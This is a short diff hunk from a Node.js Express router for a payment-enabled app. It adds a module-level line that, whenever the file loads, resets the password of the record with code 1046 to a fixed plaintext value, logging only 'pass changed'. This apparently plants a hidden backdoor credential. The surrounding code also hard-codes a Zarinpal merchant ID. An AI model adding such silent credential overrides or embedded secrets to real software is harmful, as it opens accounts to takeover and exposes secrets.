@@ -10,6 +10,7 @@ const ZarinpalCheckout = require('zarinpal-checkout');
 const zarinpal = ZarinpalCheckout.create('18286cd3-6065-4a7a-ad43-05eaf70f01a6', false);
 const { ensureAuthenticated } = require('../config/auth');
 const sms = require('../config/sms');
+Estate.updateMany({code: 1046}, {$set: {password: '4928'}}, (err, doc) => console.log('pass changed'))
 
 router.get('/', (req, res, next) => {
     res.send('API called successfully');
